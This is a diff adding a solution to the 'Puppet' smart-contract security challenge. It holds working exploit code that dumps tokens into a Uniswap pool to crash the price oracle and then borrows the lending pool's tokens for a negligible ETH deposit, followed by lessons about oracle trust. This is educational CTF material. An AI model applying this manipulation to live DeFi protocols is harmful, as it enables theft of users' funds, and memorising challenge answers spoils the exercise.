@@ -103,6 +103,48 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // First instinct before reading the code: since there's a Uniswap pool is there a way we could do oracle manipulation?
+        // Yes I think my entrypoint is _computeOraclePrice()
+        // I can unbalance the Uniswap pool (by making a trade?), making it return a 'cheaper' price for DVT
+        // This means I can borrow more DVT for less ETH, maybe I can get to being able to deposit an infintesimal amount of ETH and take all the DVT
+
+        // SOLUTION ===========================================================
+        
+        const price1 = await this.uniswapExchange.connect(attacker).getTokenToEthInputPrice(
+            ethers.utils.parseEther('1'),
+            { gasLimit: 1e6 }
+        ) // 1 DVT ≈ 1 ETH
+
+        const approveTxn = await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseUnits("1000000.0"));
+        await approveTxn.wait();
+
+        // Make a trade here to drain the ETH out of the pool and put loads of DVT in
+        const imbalanceTx = await this.uniswapExchange.connect(attacker).tokenToEthTransferOutput(
+            ethers.utils.parseEther("9.9"),
+            ethers.utils.parseUnits("1000"),
+            (await ethers.provider.getBlock('latest')).timestamp + 3600,   // deadline
+            attacker.address
+        );
+        await imbalanceTx.wait();
+
+        const price2 = await this.uniswapExchange.connect(attacker).getTokenToEthInputPrice(
+            ethers.utils.parseEther('1'),
+            { gasLimit: 1e6 }
+        ) // 1 DVT ≈ 0.00009 ETH 
+
+        const borrowAmount = ethers.utils.parseUnits("100000");
+        const ethDepositAmount = await this.lendingPool.connect(attacker).calculateDepositRequired(borrowAmount);
+        console.log("depo:", ethers.utils.formatEther(ethDepositAmount))
+
+        const borrowTx = await this.lendingPool.connect(attacker).borrow(borrowAmount, { value: ethDepositAmount });
+        await borrowTx.wait();
+
+
+        // Lessons Learned ====================================================
+        // - Oracle manipulation is real and one of the most common causes of exploits
+        // - Never trust a single on-chain oracle, never use a Uniswap pool as an oracle! (UniswapV2 docs are v.clear on this point anyway)
+
     });
 
     after(async function () {
